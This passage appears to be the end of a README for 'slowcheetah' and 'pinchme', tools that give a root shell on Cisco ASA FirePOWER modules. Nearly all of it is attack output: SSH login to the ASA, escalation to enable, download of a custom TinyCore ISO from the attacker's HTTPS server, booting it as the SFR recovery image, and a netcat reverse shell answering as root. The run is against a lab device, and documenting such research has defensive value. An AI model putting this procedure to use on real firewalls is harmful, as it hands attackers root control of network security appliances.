Mod-sfr 638> [    0.596256] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
Mod-sfr 639> [    0.599081] pci 0000:00:01.0: PIIX3: Enabling Passive Release
Mod-sfr 640> [    0.601823] pci 0000:00:01.0: Activating ISA DMA hang workarounds
Mod-sfr 641> [    0.605165] Trying to unpack rootfs image as initramfs...
Mod-sfr 642> [    2.828642] Freeing initrd memory: 37844k freed
Mod-sfr 643> [    2.854175] microcode: CPU0 sig=0x623, pf=0x0, revision=0x1
Mod-sfr 644> [    2.856847] microcode: CPU1 sig=0x623, pf=0x0, revision=0x1
Mod-sfr 645> [    2.859539] microcode: CPU2 sig=0x623, pf=0x0, revision=0x1
Mod-sfr 646> [    2.862455] microcode: Microcode Update Driver: v2.00 <tigran@aivazian.fsnet.co
Mod-sfr 647> .uk>, Peter Oruba
Mod-sfr 648> [    2.869471] HugeTLB registered 2 MB page size, pre-allocated 0 pages
Mod-sfr 649> [    2.873353] VFS: Disk quotas dquot_6.5.2
Mod-sfr 650> [    2.875318] Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
Mod-sfr 651> [    2.879900] NFS: Registering the id_resolver key type
Mod-sfr 652> [    2.882340] Key type id_resolver registered
Mod-sfr 653> [    2.884308] Key type id_legacy registered
Mod-sfr 654> [    2.886597] msgmni has been set to 4415
Mod-sfr 655> [    2.890289] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251
Mod-sfr 656> [    2.893711] io scheduler noop registered
Mod-sfr 657> [    2.895605] io scheduler deadline registered
Mod-sfr 658> [    2.897782] io scheduler cfq registered (default)
Mod-sfr 659> [    2.903332] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input
Mod-sfr 660> [    2.906770] ACPI: Power Button [PWRF]
Mod-sfr 661> [    2.917578] ACPI: PCI Interrupt Link [LNKD] enabled at IRQ 11
Mod-sfr 662> [    2.923920] ACPI: PCI Interrupt Link [LNKA] enabled at IRQ 10
Mod-sfr 663> [    2.930745] ACPI: PCI Interrupt Link [LNKC] enabled at IRQ 11
Mod-sfr 664> [    2.939459] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
Mod-sfr 665> [    2.970409] 00:05: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
Mod-sfr 666> [    3.001273] 00:06: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
Mod-sfr 667> [    3.007682] Non-volatile memory driver v1.3
Mod-sfr 668> [    3.009670] Linux agpgart interface v0.103
Mod-sfr 669> [    3.012941] [drm] Initialized drm 1.1.0 20060810
Mod-sfr 670> [    3.017142] Floppy drive(s): fd0 is 1.44M, fd1 is 1.44M
Mod-sfr 671> [    3.025418] brd: module loaded
Mod-sfr 672> [    3.032521] loop: module loaded
Mod-sfr 673> [    3.032934] FDC 0 is a S82078B
Mod-sfr 674> [    3.039110]  vda: vda1
Mod-sfr 675> [    3.045289] Loading iSCSI transport class v2.0-870.
Mod-sfr 676> [    3.057479] scsi0 : ata_piix
Mod-sfr 677> [    3.059766] scsi1 : ata_piix
Mod-sfr 678> [    3.061641] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc0c0 irq 14
Mod-sfr 679> [    3.064786] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc0c8 irq 15
Mod-sfr 680> [    3.068470] e100: Intel(R) PRO/100 Network Driver, 3.5.24-k2-NAPI
Mod-sfr 681> [    3.071602] e100: Copyright(c) 1999-2006 Intel Corporation
Mod-sfr 682> [    3.074485] igb: Intel(R) Gigabit Ethernet Network Driver - version 5.0.3-k
Mod-sfr 683> [    3.077731] igb: Copyright (c) 2007-2013 Intel Corporation.
Mod-sfr 684> [    3.080682] Fusion MPT base driver 3.04.20
Mod-sfr 685> [    3.082622] Copyright (c) 1999-2008 LSI Corporation
Mod-sfr 686> [    3.084961] Fusion MPT SPI Host driver 3.04.20
Mod-sfr 687> [    3.087405] Fusion MPT FC Host driver 3.04.20
Mod-sfr 688> [    3.089825] Fusion MPT SAS Host driver 3.04.20
Mod-sfr 689> [    3.093079] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
Mod-sfr 690> [    3.096166] ehci-pci: EHCI PCI platform driver
Mod-sfr 691> [    3.098590] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
Mod-sfr 692> [    3.101824] uhci_hcd: USB Universal Host Controller Interface driver
Mod-sfr 693> [    3.105506] usbcore: registered new interface driver usblp
Mod-sfr 694> [    3.108405] usbcore: registered new interface driver usb-storage
Mod-sfr 695> [    3.111872] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 
Mod-sfr 696> irq 1,12
Mod-sfr 697> [    3.118125] serio: i8042 KBD port at 0x60,0x64 irq 1
Mod-sfr 698> [    3.120564] serio: i8042 AUX port at 0x60,0x64 irq 12
Mod-sfr 699> [    3.124108] mousedev: PS/2 mouse device common for all mice
Mod-sfr 700> [    3.129175] rtc_cmos 00:00: RTC can wake from S4
Mod-sfr 701> [    3.131421] input: AT Translated Set 2 keyboard as /devices/platform/i8042/seri
Mod-sfr 702> o0/input/input1
Mod-sfr 703> [    3.137882] rtc_cmos 00:00: rtc core: registered rtc_cmos as rtc0
Mod-sfr 704> [    3.141259] rtc_cmos 00:00: alarms up to one day, 114 bytes nvram, hpet irqs
Mod-sfr 705> [    3.145274] i2c /dev entries driver
Mod-sfr 706> [    3.147911] md: raid1 personality registered for level 1
Mod-sfr 707> [    3.151568] device-mapper: ioctl: 4.24.0-ioctl (2013-01-15) initialised: dm-dev
Mod-sfr 708> el@redhat.com
Mod-sfr 709> [    3.155484] cpuidle: using governor ladder
Mod-sfr 710> [    3.158500] hidraw: raw HID events driver (C) Jiri Kosina
Mod-sfr 711> [    3.170272] usbcore: registered new interface driver usbhid
Mod-sfr 712> [    3.173081] usbhid: USB HID core driver
Mod-sfr 713> [    3.175145] ipip: IPv4 over IPv4 tunneling driver
Mod-sfr 714> [    3.178597] TCP: cubic registered
Mod-sfr 715> [    3.180200] Initializing XFRM netlink socket
Mod-sfr 716> [    3.182590] NET: Registered protocol family 10
Mod-sfr 717> [    3.185629] NET: Registered protocol family 17
Mod-sfr 718> [    3.187814] Key type dns_resolver registered
Mod-sfr 719> [    3.191402] registered taskstats version 1
Mod-sfr 720> [    3.194683] console [netcon0] enabled
Mod-sfr 721> [    3.196442] netconsole: network logging started
Mod-sfr 722> [    3.220996] ata1.00: ATA-7: QEMU HARDDISK, 1.5.0, max UDMA/100
Mod-sfr 723> [    3.223730] ata1.00: 6291456 sectors, multi 16: LBA48 
Mod-sfr 724> [    3.227442] ata1.00: configured for MWDMA2
Mod-sfr 725> [    3.229712] scsi 0:0:0:0: Direct-Access     ATA      QEMU HARDDISK    1.5. PQ: 
Mod-sfr 726> 0 ANSI: 5
Mod-sfr 727> [    3.232251] ata2.00: ATAPI: QEMU DVD-ROM, 1.5.0, max UDMA/100
Mod-sfr 728> [    3.233884] ata2.00: configured for MWDMA2
Mod-sfr 729> [    3.240139] sd 0:0:0:0: [sda] 6291456 512-byte logical blocks: (3.22 GB/3.00 Gi
Mod-sfr 730> B)
Mod-sfr 731> [    3.240690] sd 0:0:0:0: Attached scsi generic sg0 type 0
Mod-sfr 732> [    3.242332] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     1.5. PQ: 
Mod-sfr 733> 0 ANSI: 5
Mod-sfr 734> [    3.244340] sr0: scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
Mod-sfr 735> [    3.244343] cdrom: Uniform CD-ROM driver Revision: 3.20
Mod-sfr 736> [    3.246002] sr 1:0:0:0: Attached scsi generic sg1 type 5
Mod-sfr 737> [    3.258746] sd 0:0:0:0: [sda] Write Protect is off
Mod-sfr 738> [    3.261178] sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn'
Mod-sfr 739> t support DPO or FUA
Mod-sfr 740> [    3.267295]  sda: unknown partition table
Mod-sfr 741> [    3.270246] sd 0:0:0:0: [sda] Attached SCSI disk
Mod-sfr 742> [    3.272804] Freeing unused kernel memory: 896k freed
Mod-sfr 743> INIT: version 2.86 booting
Mod-sfr 744> Please wait: booting...
Mod-sfr 745> mount: sysfs already mounted or /sys busy
Mod-sfr 746> mount: according to mtab, sysfs is already mounted on /sys
Mod-sfr 747> Starting udev [    3.554462] udevd (760): /proc/760/oom_adj is deprecated, please 
Mod-sfr 748> use /proc/760/oom_score_adj instead.
Mod-sfr 749> [    3.558834] udevd version 124 started
Mod-sfr 750> [    3.774384] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/s
Mod-sfr 751> erio1/input/input2
Mod-sfr 752> [    3.852195] tsc: Refined TSC clocksource calibration: 1249.999 MHz
Mod-sfr 753> [    4.276113] end_request: I/O error, dev fd0, sector 0
Mod-sfr 754> [    4.359113] end_request: I/O error, dev fd0, sector 0
Mod-sfr 755> and populating dev cache 
Mod-sfr 756> Root filesystem already rw, not remounting
Mod-sfr 757> Configuring network interfaces... done.
Mod-sfr 758> net.ipv4.conf.default.rp_filter = 1
Mod-sfr 759> net.ipv4.conf.all.rp_filter = 1
Mod-sfr 760> Configuring kvm-ivshmem
Mod-sfr 761> Configuring busybox-syslog
Mod-sfr 762>  System startup links for /etc/init.d/sysklogd already exist.
Mod-sfr 763> Configuring openssh-sshd
Mod-sfr 764>  Adding system startup for /etc/init.d/sshd.
Mod-sfr 765> Configuring sudo
Mod-sfr 766> Configuring ntpdate
Mod-sfr 767> adding crontab
Mod-sfr 768> Configuring update-modules
Mod-sfr 769> INIT: Entering runlevel: 5
Mod-sfr 770> Starting OpenBSD Secure Shell server: sshd
Mod-sfr 771>   generating ssh RSA key...
Mod-sfr 772>   generating ssh DSA key...
Mod-sfr 773> done.
Mod-sfr 774> Starting Advanced Configuration and Power Interface daemon: acpid.
Mod-sfr 775> acpid: starting up with proc fs
Mod-sfr 776> acpid: opendir(/etc/acpi/events): No such file or directory
Mod-sfr 777> starting Busybox inetd: inetd... done.
Mod-sfr 778> Starting ntpd: done
Mod-sfr 779> Starting syslogd/klogd: done
Mod-sfr 780> 
Cisco FirePOWER Services Boot Image
[+] Attempting to drop to the SFR console
 6.2.3
session sfr console
Opening console session with module sfr.
Connected to module sfr. Escape character sequence is 'CTRL-^X'.
.. snip ..
Please review the final configuration:
Hostname:		asasfr
Management Interface Configuration

IPv4 Configuration:	dhcp

IPv6 Configuration:	Stateless autoconfiguration
NTP configuration: 	Disabled

CAUTION:
You have selected DHCP. The system will stop functioning correctly if DHCP
changes the assigned address due to lease expiration or other reasons.
We suggest you use static addressing inste.

CAUTION:
You have selected IPv6 stateless autoconfiguration, which assigns a global address
based on network prefix and a device identifier. Although this address is unlikely
to change, if it does change, the system will stop functioning correctly.
We suggest you use static addressing instead.

Apply the changes?(y,n) [Y]: y
Configuration saved successfully!
Applying...
Restarting network services...
Done.
Press ENTER to continue...
[+] Logging out...

asasfr-boot><paramiko.Channel 0 (open) window=7978 -> <paramiko.Transport at 0xb47badc0 (cipher aes128-ctr, 128 bits) (active; 1 open channel(s))>>
exit
..snip..
Cisco FirePOWER Services Boot Image 6.2.3

asasfr login: root
Password: 
root@<paramiko.Channel 0 (open) window=7964 in-buffer=1 -> <paramiko.Transport at 0xb47badc0 (cipher aes128-ctr, 128 bits) (active; 1 open channel(s))>>
[+] Executing netcat listener
[+] Using /usr/bin/nc
Listening on 0.0.0.0 1270

[+] Sending reverse shell
Connection received on 10.12.70.253 51157
id
uid=0(root) gid=0(root)
uname -a
Linux asasfr 3.10.107sf.cisco-1 #1 SMP PREEMPT Fri Nov 10 17:06:45 UTC 2017 x86_64 GNU/Linux
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:FC:BA:44:54:31  
          inet addr:192.168.1.5  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:9 errors:0 dropped:0 overruns:0 frame:0
          TX packets:14 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1141 (1.1 KiB)  TX bytes:2076 (2.0 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```


### Using `pinchme` to achieve a shell

Of course, we don't need a Cisco created boot image at all. We can just create our own using `pinchme`. Here's an example of using the tools together (note the use of `--tinycore`):

```

albinolobster@ubuntu:~$ cd pinchme/
albinolobster@ubuntu:~/pinchme$ sudo ./pinchme.sh -i 10.12.70.252 -p 1270
LHOST: 10.12.70.252
LPORT: 1270
/home/albinolobster/pinchme/iso.qF6SA9
.. snip ..
/home/albinolobster/pinchme/iso.qF6SA9/cde/optional /home/albinolobster/pinchme
/home/albinolobster/pinchme
xorriso 1.5.2 : RockRidge filesystem manipulator, libburnia project.

Drive current: -outdev 'stdio:tinycore-custom.iso'
Media current: stdio file, overwriteable
Media status : is blank
Media summary: 0 sessions, 0 data blocks, 0 data, 63.0g free
xorriso : WARNING : -volid text does not comply to ISO 9660 / ECMA 119 rules
Added to ISO image: directory '/'='/home/albinolobster/pinchme/iso.qF6SA9'
xorriso : UPDATE :      51 files added in 1 seconds
xorriso : UPDATE :      51 files added in 1 seconds
ISO image produced: 32815 sectors
Written to medium : 32815 sectors at LBA 0
Writing to 'stdio:tinycore-custom.iso' completed successfully.

19345 blocks
Cloning into 'doom-ascii'...
remote: Enumerating objects: 338, done.
remote: Counting objects: 100% (338/338), done.
remote: Compressing objects: 100% (210/210), done.
remote: Total 338 (delta 151), reused 313 (delta 126), pack-reused 0
Receiving objects: 100% (338/338), 3.31 MiB | 2.31 MiB/s, done.
Resolving deltas: 100% (151/151), done.
--2022-06-30 04:10:12--  https://archive.org/download/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip
Resolving archive.org (archive.org)... 207.241.224.2
Connecting to archive.org (archive.org)|207.241.224.2|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://ia801900.us.archive.org/28/items/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip [following]
--2022-06-30 04:10:12--  https://ia801900.us.archive.org/28/items/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip
Resolving ia801900.us.archive.org (ia801900.us.archive.org)... 207.241.228.100
Connecting to ia801900.us.archive.org (ia801900.us.archive.org)|207.241.228.100|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4808638 (4.6M) [application/zip]
Saving to: ‘Doom (v1.9).zip’

Doom (v1.9).zip                                    100%[===============================================================================================================>]   4.58M  1.69MB/s    in 2.7s    

2022-06-30 04:10:15 (1.69 MB/s) - ‘Doom (v1.9).zip’ saved [4808638/4808638]

39399 blocks
    15949627    15583987  97% core.gz
    15949627    15583987  97%
I: -input-charset not specified, using utf-8 (detected in locale settings)
Size of boot image is 4 sectors -> No emulation
 13.44% done, estimate finish Thu Jun 30 04:10:42 2022
 26.89% done, estimate finish Thu Jun 30 04:10:42 2022
 40.32% done, estimate finish Thu Jun 30 04:10:42 2022
 53.76% done, estimate finish Thu Jun 30 04:10:42 2022
 67.22% done, estimate finish Thu Jun 30 04:10:42 2022
 80.67% done, estimate finish Thu Jun 30 04:10:42 2022
 94.10% done, estimate finish Thu Jun 30 04:10:42 2022
Total translation table size: 2048
Total rockridge attributes bytes: 4909
Total directory bytes: 12288
Path table size(bytes): 66
Max brk space used 23000
37204 extents written (72 MB)
albinolobster@ubuntu:~/pinchme$ cd ..
albinolobster@ubuntu:~$ cd slowcheetah/
albinolobster@ubuntu:~/slowcheetah$ python3 slowcheetah.py --rhost 10.12.70.253 --lhost 10.12.70.252 --http_addr 10.12.70.252 --username albinolobster --password labpass1 --upload_image ~/pinchme/tinycore-custom.iso --tinycore --verbose

   _____ __                 ________              __        __
  / ___// /___ _      __   / ____/ /_  ___  ___  / /_____ _/ /_
  \__ \/ / __ \ | /| / /  / /   / __ \/ _ \/ _ \/ __/ __ `/ __ \
 ___/ / / /_/ / |/ |/ /  / /___/ / / /  __/  __/ /_/ /_/ / / / /
/____/_/\____/|__/|__/   \____/_/ /_/\___/\___/\__/\__,_/_/ /_/

   🦞 ASA-X with FirePOWER Service Boot Image Root Shell 🦞

[+] Spinning up HTTPS server thread
Generating a RSA private key
...............................++++
....................++++
writing new private key to 'key.pem'
-----
[+] Server running on https://10.12.70.252:8443
[+] Authenticating to 10.12.70.253:22 as albinolobster:labpass1
User albinolobster logged in to ciscoasa
Logins over the last 1 days: 10.  Last login: 11:13:42 UTC Jun 30 2022 from 10.12.70.252
Failed logins since the last login: 0.  
Type help or '?' for a list of available commands.
ciscoasa> 
[+] Attempting to escalate to an enable prompt
en
Password: 
ciscoasa# copy /noconfirm https://10.12.70.252:8443/tinycore-custom.iso disk0:$

10.12.70.253 - - [30/Jun/2022 04:11:41] "GET /tinycore-custom.iso HTTP/1.0" 200 -
----------------------------------------
Exception happened during processing of request from ('10.12.70.253', 19534)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 316, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 347, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/http/server.py", line 647, in __init__
    super().__init__(*args, **kwargs)
  File "/usr/lib/python3.8/socketserver.py", line 747, in __init__
    self.handle()
  File "/usr/lib/python3.8/http/server.py", line 427, in handle
    self.handle_one_request()
  File "/usr/lib/python3.8/http/server.py", line 415, in handle_one_request
    method()
  File "/usr/lib/python3.8/http/server.py", line 654, in do_GET
    self.copyfile(f, self.wfile)
  File "/usr/lib/python3.8/http/server.py", line 853, in copyfile
    shutil.copyfileobj(source, outputfile)
  File "/usr/lib/python3.8/shutil.py", line 208, in copyfileobj
    fdst_write(buf)
  File "/usr/lib/python3.8/socketserver.py", line 826, in write
    self._sock.sendall(b)
  File "/usr/lib/python3.8/ssl.py", line 1204, in sendall
    v = self.send(byte_view[count:])
  File "/usr/lib/python3.8/ssl.py", line 1173, in send
    return self._sslobj.write(data)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
10.12.70.253 - - [30/Jun/2022 04:11:41] "GET /tinycore-custom.iso HTTP/1.0" 200 -
Accessing https://10.12.70.252:8443/tinycore-custom.iso...!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Writing file disk0:/tinycore-custom.iso...
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
INFO: No digital signature found
76193792 bytes copied in 10.170 secs (7619379 bytes/sec)
ciscoasa# [+] Authenticating to 10.12.70.253:22 as albinolobster:labpass1
User albinolobster logged in to ciscoasa
Logins over the last 1 days: 11.  Last login: 11:18:28 UTC Jun 30 2022 from 10.12.70.252
Failed logins since the last login: 0.  
Type help or '?' for a list of available commands.
ciscoasa> 
[+] Attempting to escalate to an enable prompt
en
Password: 
ciscoasa# 
[+] Attempting to start the provided boot image
show module sfr

Mod  Card Type                                    Model              Serial No. 
---- -------------------------------------------- ------------------ -----------
 sfr Unknown                                      N/A                JAD221400UD

Mod  MAC Address Range                 Hw Version   Fw Version   Sw Version     
---- --------------------------------- ------------ ------------ ---------------
 sfr 00fc.ba44.5431 to 00fc.ba44.5431  N/A          N/A          

Mod  SSM Application Name           Status           SSM Application Version
---- ------------------------------ ---------------- --------------------------

Mod  Status             Data Plane Status     Compatibility
---- ------------------ --------------------- -------------
 sfr Recover            Not Applicable        

ciscoasa# sw-module module sfr recover stop
Further recovery of module sfr was stopped. This may take several minutes to complete.
ciscoasa# 
[!] Resetting SFR module from recover state. Sleeping for 120 seconds to let this take affect.
show module sfr

Mod  Card Type                                    Model              Serial No. 
---- -------------------------------------------- ------------------ -----------
 sfr Unknown                                      N/A                JAD221400UD

Mod  MAC Address Range                 Hw Version   Fw Version   Sw Version     
---- --------------------------------- ------------ ------------ ---------------
 sfr 00fc.ba44.5431 to 00fc.ba44.5431  N/A          N/A          

Mod  SSM Application Name           Status           SSM Application Version
---- ------------------------------ ---------------- --------------------------
 sfr Unknown                        No Image Present Not Applicable

Mod  Status             Data Plane Status     Compatibility
---- ------------------ --------------------- -------------
 sfr Unresponsive       Not Applicable        

ciscoasa# 
[+] This may take a few minutes - Booting recover image: disk0:/tinycore-custom.iso
sw-module module sfr recover configure image disk0:/tinycore-custom.$
ciscoasa# debug module-boot
debug module-boot  enabled at level 1
ciscoasa# sw-module module sfr recover boot

Module sfr will be recovered. This may erase all configuration and all data
on that device and attempt to download/install a new image for it. This may take
several minutes.

Recover module sfr? [confirm]
Recover issued for module sfr.
ciscoasa# Mod-sfr 806> ***
Mod-sfr 807> *** EVENT: Creating the Disk Image...
Mod-sfr 808> *** TIME: 11:20:39 UTC Jun 30 2022
Mod-sfr 809> ***
Mod-sfr 810> ***
Mod-sfr 811> *** EVENT: The module is being recovered.
Mod-sfr 812> *** TIME: 11:20:39 UTC Jun 30 2022
Mod-sfr 813> ***
Mod-sfr 814> ***
Mod-sfr 815> *** EVENT: Disk Image created successfully.
Mod-sfr 816> *** TIME: 11:22:19 UTC Jun 30 2022
Mod-sfr 817> ***
Mod-sfr 818> ***
Mod-sfr 819> *** EVENT: Start Parameters: Image: /mnt/disk0/vm/vm_1.img, ISO: -cdrom /mnt/disk0
Mod-sfr 820> /tinycore-custom.iso, Num CPUs: 3, RAM: 2249MB, Mgmt MAC: 00:FC:BA:44:54:31, CP MA
Mod-sfr 821> C: 00:00:00:02:00:01, HDD: -drive file=/dev/sda,cache=none,if=virtio, Dev Driver: 
Mod-sfr 822> vir
Mod-sfr 823> ***
Mod-sfr 824> *** EVENT: Start Parameters Continued: RegEx Shared Mem: 0MB, Cmd Op: r, Shared Me
Mod-sfr 825> m Key: 8061, Shared Mem Size: 16, Log Pipe: /dev/ttyS0_vm1, Sock: /dev/ttyS1_vm1, 
Mod-sfr 826> Mem-Path: -mem-path /hugepages
Mod-sfr 827> *** TIME: 11:22:19 UTC Jun 30 2022
Mod-sfr 828> ***
Mod-sfr 829> Status: Mapping host 0x2aab37e00000 to VM with size 16777216
Mod-sfr 830> Warning: vlan 0 is not connected to host network[+] Executing netcat listener.
[+] Using /usr/bin/nc
[+] Please wait...
Listening on 0.0.0.0 1270
Connection received on 10.12.70.253 38437
id
uid=0(root) gid=0(root) groups=0(root)
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:00:00:02:00:01  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:253 errors:0 dropped:240 overruns:0 frame:0
          TX packets:23 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:13714 (13.3 KiB)  TX bytes:7866 (7.6 KiB)

eth1      Link encap:Ethernet  HWaddr 00:FC:BA:44:54:31  
          inet addr:192.168.1.5  Bcast:192.168.1.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1010 (1010.0 B)  TX bytes:932 (932.0 B)

eth2      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:23 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:7866 (7.6 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

uname -a
Linux box 3.16.6-tinycore #777 SMP Thu Oct 16 09:42:42 UTC 2014 i686 GNU/Linux

```

## Credit

* [Red Hot Chili Peppers](https://www.youtube.com/watch?v=-877RlLrhJA)

